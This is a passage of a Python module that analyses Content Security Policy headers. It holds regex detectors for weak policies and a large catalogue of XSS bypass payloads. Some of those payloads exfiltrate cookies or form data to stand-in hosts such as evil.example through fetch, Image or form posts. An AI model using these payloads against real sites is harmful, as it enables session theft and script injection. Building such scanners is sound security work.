"""
Content Security Policy (CSP) analysis and bypass automation module.
Consolidates CSP policy evaluation, weakness detection, and automated bypass payloads.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List, Optional
from urllib.parse import urlsplit


def _normalize_host_source(source: str) -> Optional[str]:
    """Return the hostname of a CSP host-source expression.

    ``None`` is returned for scheme sources (``data:``), keywords
    (``'self'``, ``'unsafe-inline'``), nonces/hashes and tokens that do not
    parse as a host.  Wildcard hosts keep their leading ``*.`` so the caller
    can apply the CSP subdomain-matching rules.
    """
    token = str(source or "").strip().strip("'\"")
    if not token:
        return None
    lower = token.lower()
    if lower.startswith(("nonce-", "sha256-", "sha384-", "sha512-")):
        return None
    if "://" in lower:
        candidate = lower
    elif lower.startswith("//"):
        candidate = "http:" + lower
    else:
        candidate = "http://" + lower
    try:
        host = urlsplit(candidate).hostname
    except ValueError:
        return None
    if not host:
        return None
    host = host.lower()
    # ``data:``/``blob:``/``https:`` parse as a host named after the scheme;
    # they are scheme sources, not hosts.
    if lower.endswith(":") and re.fullmatch(r"[a-z][a-z0-9+.-]*", host):
        return None
    return host


def _source_allows_host(source: str, host: str) -> bool:
    """Whether a CSP source expression permits ``host``.

    Compares parsed hostnames instead of substrings, so
    ``https://evil.example/ajax.googleapis.com`` does not match
    ``ajax.googleapis.com``.  ``*.example.com`` follows CSP wildcard rules:
    it matches subdomains and the bare domain, but not lookalikes such as
    ``notexample.com``.
    """
    hostname = _normalize_host_source(source)
    if not hostname:
        return False
    wanted = host.lower()
    if hostname.startswith("*."):
        suffix = hostname[2:]
        return wanted == suffix or wanted.endswith("." + suffix)
    return hostname == wanted


def _is_scheme_source(source: str, scheme: str) -> bool:
    """Whether ``source`` is exactly the CSP scheme source ``scheme:``.

    Scheme sources are unquoted in CSP; a quoted ``'data:'`` is a keyword,
    not a scheme source.
    """
    return str(source or "").strip().lower() == f"{scheme.lower()}:"


def _is_csp_keyword(source: str, keyword: str) -> bool:
    """Whether ``source`` is the CSP keyword (quoted or bare, any case)."""
    return str(source or "").strip().strip("'\"").lower() == keyword.lower()


class CSPSeverity(Enum):
    """CSP issue severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class CSPDirective(Enum):
    """CSP directives relevant to XSS, clickjacking, and overall CSP posture.

    Covers CSP Level 1, 2, 3, and working-draft directives. Deprecated
    directives are kept so scanners can reliably flag outdated policies that
    look safe but are enforced by no modern browser.
    """

    # ------------------------------------------------------------------
    # --- original ------------------------------------------------------
    # ------------------------------------------------------------------
    SCRIPT_SRC = "script-src"
    DEFAULT_SRC = "default-src"
    STYLE_SRC = "style-src"
    IMG_SRC = "img-src"
    CONNECT_SRC = "connect-src"
    OBJECT_SRC = "object-src"
    FRAME_SRC = "frame-src"
    BASE_URI = "base-uri"
    FORM_ACTION = "form-action"
    REPORT_URI = "report-uri"
    REPORT_TO = "report-to"

    # ------------------------------------------------------------------
    # --- added: fetch directives (CSP Level 2 / 3) ---------------------
    # ------------------------------------------------------------------
    CHILD_SRC = "child-src"                 # superseded by frame-src / worker-src
    FONT_SRC = "font-src"
    MEDIA_SRC = "media-src"
    MANIFEST_SRC = "manifest-src"
    WORKER_SRC = "worker-src"               # CSP3
    PREFETCH_SRC = "prefetch-src"           # deprecated, dropped from spec

    # ------------------------------------------------------------------
    # --- added: granular script/style directives (CSP3) ----------------
    # ------------------------------------------------------------------
    SCRIPT_SRC_ELEM = "script-src-elem"
    SCRIPT_SRC_ATTR = "script-src-attr"
    STYLE_SRC_ELEM = "style-src-elem"
    STYLE_SRC_ATTR = "style-src-attr"

    # ------------------------------------------------------------------
    # --- added: document / navigation control -------------------------
    # ------------------------------------------------------------------
    FRAME_ANCESTORS = "frame-ancestors"     # clickjacking defense (headers only, ignored in meta)
    SANDBOX = "sandbox"
    NAVIGATE_TO = "navigate-to"             # deprecated in favor of redirect-to

    # ------------------------------------------------------------------
    # --- added: Trusted Types (CSP3, DOM-XSS specific) ----------------
    # ------------------------------------------------------------------
    REQUIRE_TRUSTED_TYPES_FOR = "require-trusted-types-for"
    TRUSTED_TYPES = "trusted-types"

    # ------------------------------------------------------------------
    # --- added: mixed content / transport hardening -------------------
    # ------------------------------------------------------------------
    UPGRADE_INSECURE_REQUESTS = "upgrade-insecure-requests"
    BLOCK_ALL_MIXED_CONTENT = "block-all-mixed-content"   # deprecated
    REQUIRE_SRI_FOR = "require-sri-for"                   # deprecated

    # ------------------------------------------------------------------
    # --- added: deprecated (legacy IE / pre-CSP3) ---------------------
    # ------------------------------------------------------------------
    REFLECTED_XSS = "reflected-xss"
    REFERRER = "referrer"
    DISOWN_OPENER = "disown-opener"
    PLUGIN_TYPES = "plugin-types"

    # ------------------------------------------------------------------
    # --- added: proposed / emerging -----------------------------------
    # ------------------------------------------------------------------
    FENCED_FRAME_SRC = "fenced-frame-src"
    WEBRTC = "webrtc"
    REDIRECT_TO = "redirect-to"             # potential successor to navigate-to

    # ------------------------------------------------------------------
    # --- added: header / meta-tag aliases (parsed as names in dumps) --
    # ------------------------------------------------------------------
    CONTENT_SECURITY_POLICY = "content-security-policy"
    CONTENT_SECURITY_POLICY_REPORT_ONLY = "content-security-policy-report-only"
    X_CONTENT_SECURITY_POLICY = "x-content-security-policy"   # legacy Chrome
    X_WEBKIT_CSP = "x-webkit-csp"                             # legacy WebKit


# ---------------------------------------------------------------------------
# Source-expression keywords — the *values* that live inside directives.
# Attackers try to sneak these past a policy, or they make a policy weak
# when present. Kept as a separate enum so scanners can match on both the
# directive name and the risky value.
# ---------------------------------------------------------------------------
class CSPSourceExpression(Enum):
    """CSP source-expression keywords and URL schemes."""

    # Universal / null
    STAR = "*"
    SELF = "'self'"
    NONE = "'none'"

    # Script-execution enablers
    UNSAFE_INLINE = "'unsafe-inline'"
    UNSAFE_EVAL = "'unsafe-eval'"
    UNSAFE_HASHES = "'unsafe-hashes'"
    STRICT_DYNAMIC = "'strict-dynamic'"
    WASM_UNSAFE_EVAL = "'wasm-unsafe-eval'"
    REPORT_SAMPLE = "'report-sample'"
    TRUSTED_TYPES_EVAL = "'trusted-types-eval'"

    # Allowlist primitives (prefix form; actual value is base64)
    NONCE = "'nonce-"
    SHA256 = "'sha256-"
    SHA384 = "'sha384-"
    SHA512 = "'sha512-"

    # URL schemes that frequently become bypasses
    DATA = "data:"
    BLOB = "blob:"
    FILESYSTEM = "filesystem:"
    HTTP = "http:"
    HTTPS = "https:"
    WS = "ws:"
    WSS = "wss:"

    # Wildcard URL forms
    WILDCARD_HOST = "https://*"
    WILDCARD_SCHEME = "*://*"
    LOCALHOST = "localhost"
    SELF_UNQUOTED = "self"          # common misconfiguration: missing quotes


# ---------------------------------------------------------------------------
# Weak / dangerous source expressions — presence means the policy is
# bypassable or functionally useless for the given directive.
# ---------------------------------------------------------------------------
CSP_WEAK_SOURCES: Dict[str, str] = {
    # Direct execution enablers
    "unsafe_inline":       r"['\"]?unsafe-inline['\"]?",
    "unsafe_eval":         r"['\"]?unsafe-eval['\"]?",
    "unsafe_hashes":       r"['\"]?unsafe-hashes['\"]?",
    "wasm_unsafe_eval":    r"['\"]?wasm-unsafe-eval['\"]?",

    # Wildcards
    "star":                r"(?<![\w-])\*(?![\w-])",
    "wildcard_host":       r"https?://\*|wss?://\*",
    "wildcard_scheme":     r"\*://",

    # Dangerous schemes (often allowlist-bypass vectors)
    "data_scheme":         r"\bdata:",
    "blob_scheme":         r"\bblob:",
    "filesystem_scheme":   r"\bfilesystem:",
    "http_scheme":         r"\bhttp:(?!//)",      # allows plaintext
    "plain_https":         r"\bhttps:",           # too broad if alone

    # Dev leftovers
    "localhost":           r"\blocalhost\b",
    "loopback_ip":         r"\b127\.0\.0\.1\b",
    "any_ip":              r"\b0\.0\.0\.0\b",
}


# ---------------------------------------------------------------------------
# CSP bypass / evaluation tooling — presence in JavaScript means the code
# has been written specifically to study or bypass a CSP. High-signal when
# correlated with `eval` / `innerHTML` sinks.
# ---------------------------------------------------------------------------
CSP_BYPASS_TOOLING: Dict[str, str] = {
    "csp_evaluator":         r"\bCSPEvaluator\b|\bcsp-evaluator\b",
    "csp_parser":            r"\bCSPParser\b|\bparse-csp\b|\bcsp_parser\b",
    "google_csp":            r"\bgoogle\s*\.\s*csp\b",
    "bypass_csp_lib":        r"\bbypass-csp\b|\bcsp-bypasser\b",
    "csp_eval_helper":       r"\bcspEval\b|\bevalCSP\b",
    "nonce_harvest":         r"\bgetAttribute\s*\(\s*['\"]nonce['\"]|\bnonce\s*=",
    "trusted_types_polyfill":r"\btrusted-types\s*\.\s*polyfill\b|\bDOMPurify\s*\.\s*isSupported\b",
    "script_gadget_probe":   r"\bangular\b[^;\n]{0,200}\bng-app\b|\bdata-ng-app\b|\bng-csp\b",
    "jsonp_callback_probe":  r"[?&]callback=|\bjsonp\b",
    "nonce_reuse_probe":     r"\bdocument\s*\.\s*currentScript\s*\.\s*nonce\b",
}


# ---------------------------------------------------------------------------
# Client-side CSP enforcement / reporting hooks — useful for detecting apps
# that log violations (often reveals the raw payloads in telemetry).
# ---------------------------------------------------------------------------
CSP_ENFORCEMENT_HOOKS: Dict[str, str] = {
    "securitypolicyviolation":    r"\bsecuritypolicyviolation\b",
    "on_securitypolicyviolation": r"\bonSecurityPolicyViolation\b",
    "report_to":                  r"\breport-to\b|\breportTo\b",
    "report_uri":                 r"\breport-uri\b|\breportUri\b",
    "ReportingObserver":          r"\bReportingObserver\b|\bnew\s+ReportingObserver\s*\(",
    "csp_report_mime":            r"['\"]application/csp-report['\"]",
    "reports_json_mime":          r"['\"]application/reports\+json['\"]",
    "report_to_header":           r"(?i)report-to\s*:",
    "nel_header":                 r"(?i)\bnel\s*:",       # Network Error Logging
}


# ---------------------------------------------------------------------------
# Header-level parsing pitfalls — how a CSP that *looks* enforced can be
# silently inert. Scanners that compare on raw header bytes need these.
#
# Note on "obfuscation": CSP directive names are exact strings on the wire
# and browsers treat them case-insensitively, so code-level obfuscation
# (`'script'+'-src'`) does not work. What *does* happen in the wild:
#  - multiple CSP headers (RFC: all must be satisfied — AND semantics)
#  - comma-split policy in one header
#  - `<meta http-equiv>` limitations (no frame-ancestors / sandbox / report-to)
#  - nonce reuse / short nonces / hash truncation
#  - uppercase keywords that browsers ignore ('UNSAFE-INLINE' ≠ 'unsafe-inline')
#  - legacy header aliases (X-Webkit-CSP, X-Content-Security-Policy)
#  - snake_case or no-separator variants found in env-var configs / dumps
# ---------------------------------------------------------------------------
CSP_HEADER_PITFALLS: Dict[str, str] = {
    # Header-name spellings that show up in dumps / config
    "header_canonical":     r"(?i)content-security-policy\b",
    "header_report_only":   r"(?i)content-security-policy-report-only\b",
    "header_snake":         r"content_security_policy",
    "header_no_sep":        r"contentsecuritypolicy",
    "legacy_x_webkit_csp":  r"(?i)x-webkit-csp\s*:",
    "legacy_x_csp":         r"(?i)x-content-security-policy\s*:",

    # Multiple CSP headers / comma-split (AND semantics — worst policy wins)
    "multiple_headers":     r"(?is)content-security-policy\s*:[^\r\n]+\r?\n[^\r\n]*content-security-policy\s*:",
    "comma_split_policy":   r"(?i)content-security-policy\s*:[^\r\n]*,[^\r\n]*default-src",

    # Meta tag (ignored: frame-ancestors, sandbox, report-to, report-uri)
    "meta_tag":             r"<meta[^>]+http-equiv\s*=\s*[\"']?Content-Security-Policy",
    "meta_tag_comment":     r"<meta[^>]+Content-Security-Policy[^>]*<!--",
    "meta_tag_frame_ancestors": r"<meta[^>]+frame-ancestors",
    "meta_tag_sandbox":     r"<meta[^>]+sandbox",

    # Weak / non-random nonces
    "weak_nonce":           r"nonce-[\w+/=]{1,7}\b",         # < 8 chars = trivially bruteforceable
    "reused_nonce":         r"(?s)nonce-([\w+/=]{8,})[^\r\n]{0,400}nonce-\1",   # same nonce twice

    # Truncated / malformed hashes
    "bad_sha_length":       r"sha(?:256|384|512)-[\w+/=]{0,20}['\"]",
    "sha_no_quote":         r"sha(?:256|384|512)-[\w+/=]+(?![‘’'\"])",

    # Case-insensitive keyword bypass tests (browsers reject mismatches)
    "uppercase_keyword":    r"'(?:UNSAFE-INLINE|UNSAFE-EVAL|SELF|NONE|STRICT-DYNAMIC)'",
    "mixedcase_keyword":    r"'(?:Unsafe-Inline|Unsafe-Eval|Self|None|Strict-Dynamic)'",

    # Directive value tricks — whitespace / semicolon evasions in meta
    "html_entity_in_meta":  r"<meta[^>]+Content-Security-Policy[^>]*&#",
    "newline_in_value":     r"(?i)script-src[^\r\n]*\r?\n\s*(?:unsafe-inline|unsafe-eval)",
}


@dataclass
class CSPIssue:
    """CSP policy issue."""
    issue_type: str
    severity: CSPSeverity
    description: str
    directive: Optional[str]
    value: Optional[str]


@dataclass
class CSPBypass:
    """CSP bypass technique."""
    technique: str
    payload: str = ""
    description: str = ""
    success_probability: float = 0.5
    # Extended fields for automator compatibility
    payload_template: str = ""
    target_directive: Optional[CSPDirective] = None
    confidence: float = 0.5

    def __post_init__(self) -> None:
        if not self.payload and self.payload_template:
            self.payload = self.payload_template
        elif not self.payload_template and self.payload:
            self.payload_template = self.payload
        if self.confidence != 0.5 and self.success_probability == 0.5:
            self.success_probability = self.confidence
        elif self.success_probability != 0.5 and self.confidence == 0.5:
            self.confidence = self.success_probability


@dataclass
class CSPAnalysis:
    """Complete CSP analysis."""
    is_strict: bool
    bypass_possible: bool
    issues: List[CSPIssue]
    bypasses: List[CSPBypass]
    directives: Dict[str, List[str]]
    raw_csp: str


class CSPAnalyzer:
    """
    Advanced CSP analyzer.
    Analyzes Content-Security-Policy headers for bypass opportunities and weaknesses.
    """

    DANGEROUS_VALUES = [
        # --- original -----------------------------------------------------
        '*', 'unsafe-inline', 'unsafe-eval', 'data:', 'blob:', 'http:', 'https:',

        # --- added: more bypass-prone source expressions ------------------
        "'unsafe-hashes'", "unsafe-hashes",
        "'wasm-unsafe-eval'", "wasm-unsafe-eval",
        'filesystem:',
        'ws:', 'wss:',                     # connect-src exfil
        'javascript:', 'vbscript:',
        '*://*',                           # fully wildcard scheme+host
        'https://*', 'http://*',           # wildcard host
        'localhost', '127.0.0.1', '0.0.0.0',
    ]

    REQUIRED_DIRECTIVES = [
        'default-src',
        'script-src',
    ]

    RECOMMENDED_DIRECTIVES = [
        # --- original -----------------------------------------------------
        'object-src', 'base-uri', 'form-action', 'frame-ancestors',

        # --- added: modern hardening checklist ---------------------------
        'require-trusted-types-for',
        'trusted-types',
        'worker-src',
        'manifest-src',
        'script-src-elem',
        'script-src-attr',
        'style-src-elem',
        'style-src-attr',
        'sandbox',
        'upgrade-insecure-requests',
    ]

    BYPASS_TECHNIQUES = {
        # =================================================================
        # --- original ----------------------------------------------------
        # =================================================================
        'unsafe_inline': {
            'technique': 'unsafe-inline bypass',
            'payload': '<script>alert(1)</script>',
            'description': 'Direct script execution with unsafe-inline',
        },
        'wildcard_origin': {
            'technique': 'Wildcard origin bypass',
            'payload': '<script src="http://evil.com/exploit.js"></script>',
            'description': 'Load scripts from any origin with wildcard',
        },
        'data_uri': {
            'technique': 'data: URI bypass',
            'payload': '<script src="data:text/javascript,alert(1)"></script>',
            'description': 'Execute script from data URI',
        },
        'jsonp_gadget': {
            'technique': 'JSONP gadget bypass',
            'payload': '<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&q=test&callback=alert(1)"></script>',
            'description': 'Use JSONP gadget to execute code',
        },
        'angular_cdn': {
            'technique': 'Angular CDN bypass',
            'payload': '{{xss="alert(1)"}}',
            'description': 'Angular template injection with CDN',
        },
        'nonce_reuse': {
            'technique': 'Nonce reuse bypass',
            'payload': '<script nonce="KNOWN_NONCE">alert(1)</script>',
            'description': 'Reuse valid nonce if predictable',
        },
        'unsafe_eval': {
            'technique': 'unsafe-eval bypass',
            'payload': '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            'description': 'Dynamic code execution with unsafe-eval',
        },
        'strict_dynamic_gadget': {
            'technique': 'strict-dynamic gadget',
            'payload': '<script src="/static/app.js"></script>',
            'description': 'A trusted script that consumes a DOM source creates script',
        },
        'weak_nonce': {
            'technique': 'Weak nonce prediction',
            'payload': '<script nonce="{nonce}">alert(1)</script>',
            'description': 'Short or reused nonce lets an injected script borrow it',
        },
        'base_uri_hijack': {
            'technique': 'base-uri hijack',
            'payload': '<base href="https://attacker.tld/">',
            'description': 'Missing base-uri redirects relative script loads',
        },
        'object_data': {
            'technique': 'object data bypass',
            'payload': '<object data="data:text/html,alert(1)"></object>',
            'description': 'Missing object-src permits plugin/HTML objects',
        },

        # =================================================================
        # --- added: script execution primitives --------------------------
        # =================================================================
        'wasm_unsafe_eval': {
            'technique': 'wasm-unsafe-eval bypass',
            'payload': 'WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]),{})',
            'description': "CSP3 'wasm-unsafe-eval' re-enables WebAssembly instantiation; used as an eval gadget",
        },
        'blob_uri': {
            'technique': 'blob: URI bypass',
            'payload': '<script src="blob:https://example.com/2f3a..."></script>',
            'description': 'blob: allowed in script-src lets attacker-crafted JS execute',
        },
        'filesystem_uri': {
            'technique': 'filesystem: URI bypass',
            'payload': '<script src="filesystem:https://example.com/temporary/x.js"></script>',
            'description': 'filesystem: origin permitted in script-src',
        },
        'data_html_iframe': {
            'technique': 'data:text/html frame injection',
            'payload': '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
            'description': 'data: allowed in frame-src / default-src lets arbitrary HTML+JS run in an iframe',
        },

        # =================================================================
        # --- added: allowlist / origin bypasses --------------------------
        # =================================================================
        'wildcard_subdomain_user_content': {
            'technique': 'Wildcard subdomain + user content bypass',
            'payload': '<script src="https://usercontent.example.com/uploads/evil.js"></script>',
            'description': 'script-src *.example.com is trivially bypassed when any subdomain hosts user content or is take-overable',
        },
        'self_path_traversal': {
            'technique': "'self' + path traversal bypass",
            'payload': '<script src="/static/../uploads/evil.js"></script>',
            'description': "script-src 'self' trusts any path on the same origin, including user-uploaded files",
        },
        'self_open_redirect': {
            'technique': "'self' + open redirect bypass",
            'payload': '<script src="/redirect?url=https://evil.example/evil.js"></script>',
            'description': "script-src 'self' follows any redirect the origin makes, including to attacker hosts",
        },
        'self_json_endpoint': {
            'technique': "'self' + JSON/JSONP endpoint bypass",
            'payload': '<script src="/api/data?callback=alert(1)"></script>',
            'description': 'Any same-origin endpoint that reflects caller-supplied data becomes a script',
        },
        'http_downgrade': {
            'technique': 'http: downgrade / MITM bypass',
            'payload': '<script src="http://example.com/x.js"></script>',
            'description': 'script-src that includes http: enables MITM script injection',
        },
        'broad_https_scheme': {
            'technique': "script-src 'https:' overscope",
            'payload': '<script src="https://attacker.example/x.js"></script>',
            'description': "script-src https: effectively allows any HTTPS host — the entire web is the allowlist",
        },
        'cdn_jsonp_google': {
            'technique': 'Google APIs JSONP gadget',
            'payload': '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
            'description': 'Historically allowed JSONP endpoint on an allowlisted Google domain',
        },
        'cdn_jsonp_generic': {
            'technique': 'Generic JSONP endpoint on allowlisted CDN',
            'payload': '<script src="https://allowlisted.cdn/api?callback=alert(1)"></script>',
            'description': 'Many allowlisted CDNs host endpoints that honor a caller-supplied `callback` parameter',
        },
        'content_type_confusion': {
            'technique': 'Content-type confusion / MIME sniffing',
            'payload': '<script src="/uploads/x.txt"></script>',
            'description': 'Without X-Content-Type-Options:nosniff, a text file can execute as script',
        },

        # =================================================================
        # --- added: script-gadget / framework bypasses -------------------
        # =================================================================
        'angular_ng_app_ng_csp': {
            'technique': 'AngularJS ng-app + ng-csp gadget',
            'payload': '<div ng-app ng-csp><div ng-click="$event.view.alert(1)">x</div></div>',
            'description': 'Any page that bootstraps Angular via ng-app is executable by injected markup, even under strict CSP',
        },
        'angular_constructor': {
            'technique': 'AngularJS template expression RCE (<= 1.5)',
            'payload': '{{constructor.constructor(\'alert(1)\')()}}',
            'description': 'AngularJS evaluates template expressions; constructor chain reaches Function',
        },
        'angular_template_proto': {
            'technique': 'AngularJS prototype-chain template gadget',
            'payload': '{{$eval.constructor(\'alert(1)\')()}}',
            'description': 'Angular expression parser resolves `$eval` from scope; constructor chain executes',
        },
        'vue_template_injection': {
            'technique': 'Vue.js template injection',
            'payload': '<div id="app">{{constructor.constructor(\'alert(1)\')()}}</div>',
            'description': 'Vue 2 runtime-compiled templates execute expressions when user input flows into a template',
        },
        'knockout_template': {
            'technique': 'Knockout.js data-bind gadget',
            'payload': '<div data-bind="click:alert(1)">x</div>',
            'description': 'Knockout `data-bind` expressions execute attacker-supplied code on allowlisted page',
        },
        'ember_template': {
            'technique': 'Ember.js template gadget',
            'payload': '<script type="text/x-handlebars">{{constructor.constructor(\'alert(1)\')()}}</script>',
            'description': 'Handlebars/Ember template literals in HTML execute on bootstrap',
        },
        'requirejs_data_main': {
            'technique': 'RequireJS data-main hijack',
            'payload': '<script data-main="//evil.example/x.js" src="/js/require.js"></script>',
            'description': 'A page that loads RequireJS is a script gadget; attacker controls the `data-main` URL',
        },
        'webpack_jsonp_chunk': {
            'technique': 'Webpack JSONP chunk hijack',
            'payload': '<script src="/static/js/1.chunk.js?callback=webpackJsonp"></script>',
            'description': 'Webpack JSONP runtime trusts any chunk; attacker-crafted chunk via allowlisted origin or path traversal',
        },
        'amp_script': {
            'technique': 'AMP amp-script gadget',
            'payload': '<amp-script script="myscript"><p>hi</p></amp-script>',
            'description': 'AMP pages allow inline JS inside amp-script even under script-src restrictions',
        },
        'polyfill_supply_chain': {
            'technique': 'Polyfill.io / supply-chain bypass',
            'payload': '<script src="https://polyfill.io/v3/polyfill.min.js?features=alert"></script>',
            'description': 'Allowlisted supply-chain host is a ready-made injection surface (2024 Polyfill.io incident)',
        },
        'jquery_html_sink': {
            'technique': 'jQuery .html() gadget',
            'payload': '$("<img src=x onerror=alert(1)>").appendTo(document.body)',
            'description': 'On pages that ship jQuery, .html()/append() reparse strings into executable DOM',
        },

        # =================================================================
        # --- added: nonce / hash bypasses --------------------------------
        # =================================================================
        'nonce_currentscript': {
            'technique': 'Nonce theft via document.currentScript',
            'payload': 'document.write(`<script nonce="${document.currentScript.nonce}">alert(1)</script>`)',
            'description': 'An executed script can read its own nonce and write a new script with it',
        },
        'nonce_css_attribute_selector': {
            'technique': 'Nonce exfil via CSS attribute selector',
            'payload': 'script[nonce^="a"]{background:url(//evil/a)} script[nonce^="b"]{background:url(//evil/b)}',
            'description': "Under style-src 'unsafe-inline', CSS brute-forces the nonce character by character",
        },
        'nonce_cache_reuse': {
            'technique': 'Nonce reused across responses',
            'payload': '<script nonce="FIXED_NONCE">alert(1)</script>',
            'description': 'Servers that cache HTML with a fixed nonce let any cached copy leak the nonce',
        },
        'unsafe_hashes_events': {
            'technique': "'unsafe-hashes' event-handler bypass",
            'payload': '<img src=x onerror="alert(1)">',
            'description': "When 'unsafe-hashes' is set, event handlers matching a known hash are allowed",
        },
        'unsafe_hashes_js_uri': {
            'technique': "'unsafe-hashes' javascript: URI bypass",
            'payload': '<a href="javascript:alert(1)">x</a>',
            'description': "With 'unsafe-hashes', a hashed javascript: URI executes",
        },
        'hash_collision': {
            'technique': 'Hash collision / legacy hash bypass',
            'payload': '<script>/* sha256 padding collision */</script>',
            'description': 'CSP1 hashes without proper padding were vulnerable to length-extension collisions',
        },

        # =================================================================
        # --- added: strict-dynamic bypasses ------------------------------
        # =================================================================
        'strict_dynamic_legacy_fallback': {
            'technique': 'strict-dynamic + legacy fallback',
            'payload': '<script>alert(1)</script>',
            'description': "Browsers that ignore 'strict-dynamic' (IE, old Safari) fall back to any other source in script-src",
        },
        'strict_dynamic_base_hijack': {
            'technique': 'strict-dynamic + base-hijack',
            'payload': '<base href="https://evil.example/">',
            'description': 'strict-dynamic does not protect against <base> — relative script loads go to attacker origin',
        },
        'strict_dynamic_polyfill': {
            'technique': 'strict-dynamic via polyfill / nonce-stealer gadget',
            'payload': '<script src="/static/polyfill.js"></script>',
            'description': 'A trusted script that reads location / postMessage as a script source becomes a gadget',
        },

        # =================================================================
        # --- added: structural weaknesses --------------------------------
        # =================================================================
        'base_uri_missing_relative': {
            'technique': 'base-uri missing + relative script',
            'payload': '<base href="//evil.example/"><script src="app.js"></script>',
            'description': 'Without base-uri, an injected <base> rewrites all relative script URLs',
        },
        'frame_ancestors_missing': {
            'technique': 'frame-ancestors missing — clickjacking',
            'payload': '<iframe src="https://victim.example/"></iframe>',
            'description': 'frame-ancestors is ignored in <meta> and absent by default; attacker frames the page',
        },
        'form_action_missing': {
            'technique': 'form-action missing — form hijack',
            'payload': '<form action="https://evil.example/"><input type="submit"></form>',
            'description': 'Without form-action, injected forms POST credentials to attacker',
        },
        'sandbox_allow_scripts_same_origin': {
            'technique': 'sandbox with allow-scripts allow-same-origin',
            'payload': '<iframe sandbox="allow-scripts allow-same-origin" src="/">',
            'description': 'Combining allow-scripts + allow-same-origin voids the sandbox',
        },
        'worker_src_fallback': {
            'technique': 'worker-src fallback to script-src',
            'payload': 'new Worker("/uploads/x.js")',
            'description': "When worker-src is absent it falls back to child-src → script-src → default-src; often 'self' or *",
        },
        'srcdoc_iframe': {
            'technique': 'srcdoc iframe with inherited CSP',
            'payload': '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
            'description': 'srcdoc content inherits parent CSP but bypasses many filters that miss it',
        },

        # =================================================================
        # --- added: navigation / non-script execution --------------------
        # =================================================================
        'meta_refresh_navigation': {
            'technique': '<meta http-equiv="refresh"> navigation',
            'payload': '<meta http-equiv="refresh" content="0;url=//evil.example/">',
            'description': 'CSP does not block navigation via meta refresh',
        },
        'window_name_sink': {
            'technique': 'window.name exfil sink',
            'payload': 'window.name = JSON.stringify({cookie:document.cookie}); location = "//evil.example/"',
            'description': 'CSP does not control window.name; used to smuggle data across origins',
        },
        'postmessage_gadget': {
            'technique': 'postMessage gadget',
            'payload': 'top.postMessage({type:"exec",code:"alert(1)"}, "*")',
            'description': 'Any allowlisted script that evals postMessage.data is a CSP bypass',
        },
        'window_open_gadget': {
            'technique': 'window.open + gadget chain',
            'payload': 'window.open("//evil.example/", "_blank").opener.postMessage("x", "*")',
            'description': 'Navigation and postMessage are not restricted by CSP',
        },
        'document_domain_relax': {
            'technique': 'document.domain relaxation',
            'payload': 'document.domain = "example.com";',
            'description': 'Not restricted by CSP; widens same-origin surface',
        },

        # =================================================================
        # --- added: Trusted Types bypasses -------------------------------
        # =================================================================
        'trusted_types_default_policy': {
            'technique': 'Trusted Types default policy',
            'payload': 'trustedTypes.createPolicy("default",{createHTML:s=>s,createScript:s=>s})',
            'description': 'If a permissive `default` policy is present, all sinks accept raw strings again',
        },
        'trusted_types_legacy_sinks': {
            'technique': 'Trusted Types legacy sink bypass',
            'payload': 'document.write("<script>alert(1)</script>")',
            'description': 'Not all legacy sinks are covered by Trusted Types; document.write / Range APIs vary by browser',
        },
        'trusted_types_angular_policy': {
            'technique': 'Framework-created permissive policy',
            'payload': '<div ng-bind-html="html">x</div>',
            'description': 'Angular/React create their own Trusted Types policies; if permissive they re-open XSS',
        },
        'trusted_types_polyfill_detect': {
            'technique': 'Polyfill fallback when Trusted Types missing',
            'payload': 'if(!window.trustedTypes){document.body.innerHTML = location.hash.slice(1)}',
            'description': 'Apps often ship a fallback path that skips Trusted Types when the API is absent',
        },

        # =================================================================
        # --- added: exfiltration (CSP does not stop reading) -------------
        # =================================================================
        'css_injection_exfil': {
            'technique': 'CSS injection exfil via style-src',
            'payload': 'input[value^="a"]{background:url(//evil/a)} input[value^="b"]{background:url(//evil/b)}',
            'description': "style-src 'unsafe-inline' / broad allowlist enables data exfil character-by-character",
        },
        'img_src_exfil': {
            'technique': 'img-src exfil',
            'payload': 'new Image().src = "//evil.example/?" + document.cookie',
            'description': 'If img-src allows the attacker host (or *) data leaves the page',
        },
        'font_src_exfil': {
            'technique': 'font-src exfil',
            'payload': '@font-face { font-family:x; src:url(//evil.example/a) }',
            'description': 'Browser makes a font request that leaks encoded data in the URL',
        },
        'connect_src_exfil': {
            'technique': 'connect-src exfil',
            'payload': 'fetch("//evil.example/", {method:"POST", body: document.cookie})',
            'description': 'Any host allowed by connect-src receives data',
        },
        'dangling_markup': {
            'technique': 'Dangling markup injection',
            'payload': '<img src="//evil.example/?a=',
            'description': 'Unclosed attribute swallows subsequent HTML (often incl. CSRF tokens); no script needed',
        },
        'media_src_exfil': {
            'technique': 'media-src exfil',
            'payload': '<video><source src="//evil.example/"></video>',
            'description': 'Videos / audio requests carry URL-encoded stolen data',
        },
        'manifest_src_exfil': {
            'technique': 'manifest-src exfil',
            'payload': '<link rel="manifest" href="//evil.example/x">',
            'description': 'Manifest requests fetch remote JSON with exfiltratable query strings',
        },
        'prefetch_src_bypass': {
            'technique': 'prefetch-src absent',
            'payload': '<link rel="prefetch" href="//evil.example/x.js">',
            'description': 'prefetch-src is deprecated; prefetches can leak URLs / cache attacker content',
        },

        # =================================================================
        # --- added: parsing edge cases / legacy --------------------------
        # =================================================================
        'meta_tag_frame_ancestors_ignored': {
            'technique': '<meta> frame-ancestors ignored',
            'payload': '<meta http-equiv="Content-Security-Policy" content="frame-ancestors \'none\'">',
            'description': 'frame-ancestors in a meta tag is silently ignored by every browser',
        },
        'meta_tag_sandbox_ignored': {
            'technique': '<meta> sandbox ignored',
            'payload': '<meta http-equiv="Content-Security-Policy" content="sandbox">',
            'description': 'sandbox in a meta tag is silently ignored',
        },
        'meta_tag_report_uri_ignored': {
            'technique': '<meta> report-uri ignored',
            'payload': '<meta http-equiv="Content-Security-Policy" content="report-uri /csp">',
            'description': 'report-uri in a meta tag is silently ignored; violations leak no telemetry',
        },
        'csp_and_meta_ordering': {
            'technique': '<meta> CSP comes after script',
